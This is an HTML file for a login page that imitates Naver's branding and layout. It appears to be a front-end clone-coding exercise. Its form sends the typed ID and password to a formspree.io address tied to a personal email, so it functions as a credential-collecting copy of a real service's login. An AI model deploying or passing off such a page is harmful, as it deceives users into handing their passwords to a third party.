<!DOCTYPE html>
<html lang="ko">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>네이버-로그인</title>
    <link rel="stylesheet" href="./CSS/style.css" />
  </head>
  <body>
    <h1 class="logo">
      <a href="https://www.naver.com/">
        <img src="./images/logo.png" srcset="./images/logo.svg" alt="naver"/>
      </a>
    </h1>
    <form action="https://formspree.io/seulbinim@gmail.com" class="login-form" method="POST">
    <fieldset>
      <legend>로그인 폼</legend>
      <div class="user-email">
        <label for="userEmail">아이디</label>
        <input name="useremail" id="userEmail" placeholder="example@naver.com" required="required" />
      </div>
      <div class="user-password">
        <label for="userPassword">비밀번호</label>
        <input name="password" id="userPassword" placeholder="*********" required="required" />
      </div>
      <div class="ip-state-wrapper">
        <div class="login-state">
          <input name="state" type="checkbox" id="loginState">
          <label for="">
            <span class="icon-check"></span>
            로그인 상태유지
          </label>
        </div>
        <div class="login-ip">
          <input name="ip" type="checkbox" id="LoginIp">
          <label for="loginIp">IP 보안</label>
        </div>
      </div>
      <button type="submit" class="btn-login">로그인</button>
    </fieldset>
    </form>
</body>
</html>
